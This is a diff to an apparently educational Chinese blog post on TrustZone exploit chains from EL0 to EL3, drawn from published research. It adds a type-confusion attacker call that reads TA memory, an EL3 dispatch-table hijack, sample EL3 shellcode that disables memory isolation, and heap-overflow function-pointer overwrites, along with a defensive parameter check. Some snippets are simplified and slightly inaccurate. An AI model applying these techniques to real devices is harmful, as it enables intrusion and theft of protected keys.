@@ -107,7 +107,70 @@ EL3 Secure Monitor:
 
 **漏洞意义**：SMC handler 是 EL3 的代码，处理来自 EL1/EL2 的不可信输入。如果 handler 中有 OOB read/write（如 CVE-2024-20820），攻击者可以直接在 EL3 上下文中触发内存损坏。
 
-### 2.3 共享内存：Normal World ↔ Secure World 通信
+下面这张时序图展示了一次完整的 SMC 世界切换——从 Android App 发起 ioctl，经 Linux Kernel TEE 驱动触发 SMC，EL3 Secure Monitor 保存/恢复寄存器上下文并切换 World，最终到达 TA 的 command handler。右侧标注了攻击者在每个阶段可以控制的输入——这些就是 TA 漏洞的触发入口：
+
+![SMC 世界切换完整流程](https://overkazaf.github.io/blogs/images/el0-to-el3/smc-flow.png)
+*完整的 SMC 调用时序。注意 EL3 Secure Monitor 在每次世界切换时保存和恢复的寄存器集合：X0-X30、SP_EL1、ELR_EL1、SPSR_EL1。这意味着两个 World 的执行上下文是完全隔离的——但共享内存（shared memory）中的数据是跨 World 可见的，这正是攻击的数据入口。*
+
+**世界切换的寄存器状态快照**：
+
+```
+┌─────────────────────────────────────────────────────────┐
+│ SMC 触发时 EL3 Secure Monitor 的寄存器操作               │
+├─────────────────────────────────────────────────────────┤
+│                                                         │
+│ ① 保存 Normal World 上下文:                              │
+│    SAVE X0-X30    → NW_context.gpr[0..30]               │
+│    SAVE SP_EL1    → NW_context.sp                       │
+│    SAVE ELR_EL1   → NW_context.pc   (返回地址)           │
+│    SAVE SPSR_EL1  → NW_context.cpsr (状态寄存器)          │
+│                                                         │
+│ ② 设置安全状态:                                          │
+│    MSR SCR_EL3, #0   ; SCR_EL3.NS = 0 → Secure World   │
+│                                                         │
+│ ③ 恢复 Secure World 上下文:                              │
+│    LOAD X0-X30    ← SW_context.gpr[0..30]               │
+│    LOAD SP_EL1    ← SW_context.sp                       │
+│    LOAD ELR_EL1   ← SW_context.pc                       │
+│    LOAD SPSR_EL1  ← SW_context.cpsr                     │
+│                                                         │
+│ ④ 返回到 Secure World:                                   │
+│    ERET           ; 跳转到 S-EL1 TEE OS 入口              │
+│                                                         │
+└─────────────────────────────────────────────────────────┘
+```
+
+**ATF 源码级参考**（`bl31/aarch64/runtime_exceptions.S`）：
+
+```armasm
+; EL3 SMC handler 入口 (ARM Trusted Firmware)
+smc_handler64:
+    ; 保存 caller 的通用寄存器
+    stp x0, x1, [sp, #CTX_GPREGS_OFFSET + CTX_GPREG_X0]
+    stp x2, x3, [sp, #CTX_GPREGS_OFFSET + CTX_GPREG_X2]
+    ; ... 保存 X4-X30 ...
+
+    ; 保存系统寄存器
+    mrs x9, elr_el3         ; 保存返回地址
+    mrs x10, spsr_el3       ; 保存状态寄存器
+    stp x9, x10, [sp, #CTX_EL3STATE_OFFSET + CTX_ELR_EL3]
+
+    ; 读取 SMC Function ID (在 X0 中)
+    mov x0, x0              ; Function ID
+    bl  smc_dispatch        ; 分发到对应 handler
+                            ; ← CVE-2024-20820: 如果 dispatch 使用
+                            ;    X0 作为数组索引且无边界检查
+                            ;    则 OOB read/write 在 EL3 上下文执行
+```
+
+### 2.3 物理内存布局
+
+在理解具体漏洞之前，需要知道各组件在物理内存中的位置。下图以 Samsung Galaxy S7 (Exynos) 为例，展示了 DRAM 中 Normal World、Secure World 和 EL3 代码段的分布，以及 TZASC 硬件控制器的强制边界：
+
+![Samsung Exynos 物理内存布局](https://overkazaf.github.io/blogs/images/el0-to-el3/memory-layout.png)
+*Galaxy S7/S9 的物理内存分布。0xFE500000 是 EL3 ATF 代码段，0xFE512440 是 Kinibi 的 mmap 黑名单——两者相距仅 0x12440 字节（~74KB），但黑名单没有保护自己所在的地址范围。这就是 Quarkslab 2019 攻击链的核心突破口。*
+
+### 2.4 共享内存：Normal World ↔ Secure World 通信
 
 应用程序（EL0）不能直接发 SMC——它通过 Linux 内核的 TEE 驱动（`/dev/tee0` 或厂商自定义接口）间接通信。数据通过**共享内存**传递：
 
@@ -177,7 +240,82 @@ TEE_Result TA_InvokeCommandEntryPoint(
 | **整数溢出** | `int16 size = user_input; malloc(size);` 负值导致 undersized allocation | Samsung `tz_otp` trustlet（BLE 指令 signed 比较绕过） |
 | **全局缓冲区覆盖** | `memcpy(global_buf, user_buf, user_len)` 覆盖相邻的函数指针 | Project Zero 2017: Widevine PRDiag（CVE-2015-6639） |
 
-### 3.3 案例深剖：Project Zero 的 Widevine TA 利用（2017）
+### 3.3 Type-Confusion 漏洞的利用细节
+
+GlobalConfusion 论文中描述的 type-confusion 漏洞值得展开——因为它影响了 14,777 个 TA 中 23% 的实例。下面用具体的 C 代码和内存布局说明攻击者如何利用它：
+
+```c
+// 有漏洞的 TA command handler (真实案例简化)
+TEE_Result TA_InvokeCommandEntryPoint(
+    void *sessCtx, uint32_t cmdId,
+    uint32_t paramTypes, TEE_Param params[4])
+{
+    // ❌ 没有检查 paramTypes!
+    // 开发者假设 params[0] 是 memref 类型
+    char *in_buf = (char *)params[0].memref.buffer;
+    size_t in_sz = params[0].memref.size;
+    
+    // 用 in_buf 作为指针读取数据
+    TEE_MemMove(out_buf, in_buf, in_sz);  // ← 任意地址读取
+    return TEE_SUCCESS;
+}
+```
+
+攻击者从 Normal World 发起调用时，故意将 `paramTypes` 设为 `VALUE_INPUT` 而非 `MEMREF_INPUT`：
+
+```c
+// 攻击者的 Normal World 代码
+TEEC_Operation op = {0};
+op.paramTypes = TEEC_PARAM_TYPES(
+    TEEC_VALUE_INPUT,    // ← 声明为 VALUE 类型
+    TEEC_NONE, TEEC_NONE, TEEC_NONE
+);
+op.params[0].value.a = 0x70100000;  // ← 伪装成指针: Widevine TA 基址
+op.params[0].value.b = 4096;        // ← 伪装成 size: 读取 4KB
+
+TEEC_InvokeCommand(&session, CMD_ID, &op, NULL);
+// 返回后 out_buf 包含 Widevine TA 内存的 4KB 数据
+```
+
+**内存中的 union 重叠**：
+
+```
+TEE_Param 在内存中的布局 (32-bit 环境):
+
+  当 paramTypes 声明为 MEMREF 时:
+  ┌──────────────────┬──────────────────┐
+  │ memref.buffer    │ memref.size      │
+  │ (void* 指针)      │ (uint32_t 大小)   │
+  │ = 正常的堆地址     │ = 正常的数据长度   │
+  └──────────────────┴──────────────────┘
+
+  当攻击者声明为 VALUE 但 TA 当作 MEMREF 解读时:
+  ┌──────────────────┬──────────────────┐
+  │ value.a          │ value.b          │
+  │ → 被当作 buffer   │ → 被当作 size     │
+  │ = 0x70100000     │ = 4096           │
+  │   (任意地址!)      │   (任意长度!)      │
+  └──────────────────┴──────────────────┘
+
+  → TA 执行 TEE_MemMove(out_buf, 0x70100000, 4096)
+  → 读取了 Widevine TA 的内存!
+```
+
+**防御方法**（GlobalPlatform 规范推荐但未强制）：
+
+```c
+// 正确的做法: 在处理参数之前检查类型
+uint32_t exp = TEE_PARAM_TYPES(
+    TEE_PARAM_TYPE_MEMREF_INPUT,
+    TEE_PARAM_TYPE_NONE,
+    TEE_PARAM_TYPE_NONE,
+    TEE_PARAM_TYPE_NONE
+);
+if (paramTypes != exp)
+    return TEE_ERROR_BAD_PARAMETERS;  // 拒绝类型不匹配的调用
+```
+
+### 3.4 案例深剖：Project Zero 的 Widevine TA 利用（2017）
 
 📺 **参考**：[Trust Issues: Exploiting TrustZone TEEs](https://projectzero.google/2017/07/trust-issues-exploiting-trustzone-tees.html)（Gal Beniamini）
 
@@ -320,7 +458,10 @@ EL3（Secure Monitor / ARM Trusted Firmware）是 ARM 系统中的**最高特权
 
 ### 5.2 案例深剖：Quarkslab 的 Kinibi mmap → EL3（2019）
 
-这是整个 Quarkslab 2019 攻击链中最精妙的一步。
+这是整个 Quarkslab 2019 攻击链中最精妙的一步。下面这张流程图展示了完整的 5 步利用过程——从映射黑名单自身开始，到最终获得 EL3 代码执行。注意右侧的 note 标注了黑名单绕过的根本原因和 dispatch table 的劫持目标：
+
+![Kinibi mmap 黑名单绕过利用流程](https://overkazaf.github.io/blogs/images/el0-to-el3/kinibi-mmap-exploit.png)
+*5 步利用流程：黄色=初始状态（黑名单存在），红色=攻击步骤（映射→清零→映射 EL3→劫持→触发），绿色=最终效果（Secure Monitor 完全控制）。核心洞察：黑名单地址 0xfe512440 不在自己的 DENY 范围内——这是整个攻击链的根源。*
 
 **问题**：已经获得了 S-EL1 Secure Driver 的代码执行，但 EL3 的代码页在物理内存中是**只读**的——Kinibi 内核的 mmap syscall 维护了一个**黑名单**，禁止映射特定的物理地址范围（包括 EL3 的代码段 `0xfe500000`）。
 
@@ -361,6 +502,60 @@ EL3（Secure Monitor / ARM Trusted Firmware）是 ARM 系统中的**最高特权
 ldr x16, [x9, x0, lsl #3]   ; 从 dispatch table 加载 handler 地址
 blr x16                       ; 跳转到 handler
                                ; ← 攻击者已将 table[target_id] 改为恶意地址
+```
+
+**SMC dispatch table 劫持的汇编级细节**：
+
+在 Step 4 中，攻击者需要在已映射的 EL3 内存中找到 SMC handler 的 dispatch table。ATF 的 SMC 分发逻辑通常是一个函数指针数组：
+
+```c
+// ATF bl31 SMC dispatch (C 伪代码)
+typedef uint64_t (*smc_handler_t)(uint32_t fid, uint64_t x1,
+                                   uint64_t x2, uint64_t x3);
+
+// dispatch table 在 EL3 .data 段
+smc_handler_t smc_handlers[] = {
+    [0] = psci_smc_handler,        // 0xfe501000
+    [1] = tsp_smc_handler,         // 0xfe501200
+    [2] = plat_smc_handler,        // 0xfe501400
+    // ...
+    [N] = vendor_smc_handler,      // ← 攻击者改为 shellcode 地址
+};
+```
+
+对应的汇编代码：
+
+```armasm
+; ATF SMC dispatch (AArch64)
+smc_dispatch:
+    ; X0 = SMC Function ID
+    and   x8, x0, #0xFF        ; 取低 8 位作为 index
+    adr   x9, smc_handlers     ; dispatch table 基址
+    ldr   x16, [x9, x8, lsl #3] ; handler = table[index]
+                                 ; ← 如果 table[N] 已被改为 0x41414141
+    blr   x16                   ; 跳转到 handler
+                                 ; ← 跳转到攻击者控制的地址!
+                                 ;    此时 CPU 在 EL3 上下文
+                                 ;    X0-X3 包含攻击者的 SMC 参数
+```
+
+**攻击者在 EL3 上下文中可以做什么**：
+
+```armasm
+; 攻击者的 shellcode (运行在 EL3!)
+el3_shellcode:
+    ; 1. 读取任意 Secure World 内存
+    ldr   x0, =0x70100000      ; Widevine TA 加载地址
+    ldr   x1, [x0]             ; 读取 Widevine 的密钥数据
+    
+    ; 2. 修改 TZASC 配置 (完全禁用内存隔离)
+    ldr   x2, =TZASC_BASE
+    str   xzr, [x2, #TZASC_REGION_ATTR]  ; 清除保护属性
+    
+    ; 3. 修改 SCR_EL3 (使 Normal World 能访问 Secure 内存)
+    mrs   x3, scr_el3
+    orr   x3, x3, #1           ; 设置 NS=1 但保留 Secure 权限
+    msr   scr_el3, x3
 ```
 
 **为什么黑名单设计失败**：这是一个经典的 **self-referential 安全错误**——保护机制（黑名单）没有保护自己。类似于一把锁保护了房间里的所有保险箱，但锁本身放在房间里没有被保护。
@@ -407,6 +602,11 @@ Linux Kernel (EL1)
 
 ### 6.3 案例深剖：Quarkslab 2024 Boot Chain 4 CVE
 
+下面这张流程图展示了 4 个 CVE 的完整串联过程——每个 CVE 解锁下一步所需的能力，最终从 USB 物理接口直达 Secure World 全内存泄露：
+
+![Boot Chain 4 CVE 利用链详解](https://overkazaf.github.io/blogs/images/el0-to-el3/boot-chain-exploit.png)
+*黄色=入口（Odin 认证绕过），红色=代码执行（JPEG 堆溢出 + Root），紫色=信息泄露（SM OOB read），深红=最终利用（任意物理内存映射），绿色=结果。每步右侧的 note 标注了该漏洞利用成功的关键前提。*
+
 📄 **博客**：[Attacking the Samsung Galaxy A* Boot Chain](https://blog.quarkslab.com/attacking-the-samsung-galaxy-a-boot-chain.html)
 
 📄 **SSTIC 论文**：[When Samsung meets MediaTek — the story of a small bug chain](https://www.sstic.org/media/SSTIC2024/SSTIC-actes/when_vendor1_meets_vendor2_the_story_of_a_small_bu/SSTIC2024-Article-when_vendor1_meets_vendor2_the_story_of_a_small_bug_chain-rossi-bellom_neveu.pdf)
@@ -440,6 +640,48 @@ void parse_jpeg(uint8_t *data, size_t data_size) {
 ```
 
 LK 的堆实现没有 canary / CFI / ASLR，堆溢出可以直接覆盖相邻的函数指针 → **bootloader 级代码执行**。
+
+**堆内存布局（溢出前 vs 溢出后）**：
+
+```
+溢出前 (正常):
+┌────────────────────┐ 低地址
+│ heap chunk header  │ size=FIXED_SIZE, in_use=1
+├────────────────────┤
+│ JPEG buffer        │ FIXED_SIZE bytes (正常 JPEG 数据)
+│ (buf)              │
+├────────────────────┤
+│ heap chunk header  │ size=..., in_use=1
+├────────────────────┤
+│ display_ops struct │ ← 包含函数指针
+│  .init = 0x48001000│    init()
+│  .draw = 0x48001200│    draw()
+│  .done = 0x48001400│    done()
+├────────────────────┤
+│ ...                │
+└────────────────────┘ 高地址
+
+溢出后 (恶意 JPEG, size > FIXED_SIZE):
+┌────────────────────┐ 低地址
+│ heap chunk header  │
+├────────────────────┤
+│ JPEG buffer        │ FIXED_SIZE bytes (正常部分)
+│ (buf)              │
+│ ...................|
+│ OVERFLOW DATA      │ ← 超出 FIXED_SIZE 的部分
+│ 覆盖 chunk header   │
+├────────────────────┤
+│ CORRUPTED STRUCT   │ ← 函数指针被覆盖!
+│  .init = 0x41414141│    → 攻击者控制
+│  .draw = 0x42424242│    → shellcode 地址
+│  .done = 0x43434343│
+├────────────────────┤
+│ ...                │
+└────────────────────┘ 高地址
+
+当 LK 调用 display_ops.draw() 时:
+  BLR X16  ; X16 = 0x42424242 → 跳转到攻击者代码
+```
 
 **CVE-2024-20820 — Secure Monitor OOB read**：
 
@@ -517,6 +759,67 @@ LK 的堆实现没有 canary / CFI / ASLR，堆溢出可以直接覆盖相邻的
 ```
 
 区别仅在于：**每一层的「接口」不同**（EL0→S-EL0 用 ioctl，S-EL0→S-EL1 用 TEE syscall，S-EL1→EL3 用 mmap/SMC），但攻击模式是递归自相似的。
+
+用伪代码表达这种递归结构：
+
+```python
+def escalate(current_level, target_level):
+    """
+    通用提权框架——每一层的攻击逻辑是同构的
+    """
+    if current_level == target_level:
+        return  # 已到达目标层
+
+    # 1. 找到当前层到下一层的通信接口
+    interface = {
+        'EL0→S-EL0':   'ioctl(/dev/tee0, TEE_IOC_INVOKE)',
+        'S-EL0→S-EL1': 'mcDriverCtrl(VALIDATOR, cmd_15)',
+        'S-EL1→EL3':   'mmap_phys(target_addr, RW)',
+        'Boot→EL3':    'SMC #0, Function_ID=target',
+    }[f'{current_level}→{next_level}']
+
+    # 2. 在接口的 handler 中找到内存损坏漏洞
+    vuln = find_vulnerability(interface)
+    # 可能是: stack_overflow / heap_overflow / type_confusion / oob_read
+
+    # 3. 构造利用
+    if has_aslr(next_level):
+        leak = info_leak(interface)        # 泄露地址，绕过 ASLR
+        base_addr = calculate_base(leak)
+    
+    if has_nx(next_level):
+        payload = build_rop_chain(base_addr)  # NX 保护 → 用 ROP
+    else:
+        payload = shellcode                    # 无 NX → 直接注入代码
+    
+    # 4. 触发漏洞，获得下一层代码执行
+    trigger(interface, payload)
+    
+    # 5. 递归: 在下一层重复同样的过程
+    escalate(next_level, target_level)
+```
+
+**四条真实攻击链在这个框架中的映射**：
+
+```
+Quarkslab 2019:
+  escalate('EL0', 'S-EL0')   # SEM 栈溢出
+  escalate('S-EL0', 'S-EL1') # VALIDATOR 栈溢出
+  escalate('S-EL1', 'EL3')   # Kinibi mmap 黑名单绕过
+
+360 Alpha Lab 2021:
+  escalate('EL0', 'S-EL0')   # Widevine TA cmd handler
+  read_sfs()                  # 不需要继续提权，SFS 可从 TA 内访问
+
+Project Zero 2017:
+  escalate('EL0', 'S-EL0')   # PRDiag 全局缓冲区溢出
+  arbitrary_rw()              # 不需要继续提权，已获得 TA 内存控制
+
+Quarkslab 2024:
+  escalate('USB', 'Boot')    # Odin 认证绕过
+  escalate('Boot', 'EL1')    # JPEG 堆溢出 → LK 代码执行
+  escalate('EL1', 'EL3')     # SMC OOB + phys mmap
+```
 
 ---
 
